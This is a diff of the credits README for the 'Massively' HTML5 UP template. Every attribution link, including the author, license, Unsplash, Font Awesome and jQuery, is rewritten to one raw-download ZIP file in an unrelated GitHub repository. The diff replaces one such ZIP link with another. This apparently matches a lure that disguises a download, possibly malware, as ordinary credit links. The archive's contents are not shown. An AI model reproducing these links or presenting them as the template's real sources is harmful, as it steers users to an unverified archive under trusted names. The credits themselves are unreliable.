@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
+https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip | @ajlkn
+https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
+		Unsplash (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip)
 
 	Icons:
-		Font Awesome (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
+		Font Awesome (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip)
 
 	Other:
-		jQuery (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
-		Scrollex (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
-		Responsive Tools (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
+		jQuery (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip)
+		Scrollex (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip)
+		Responsive Tools (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/io_B_github_PORTFOLI_ANALYS_DAT_DE_v2.8.zip)
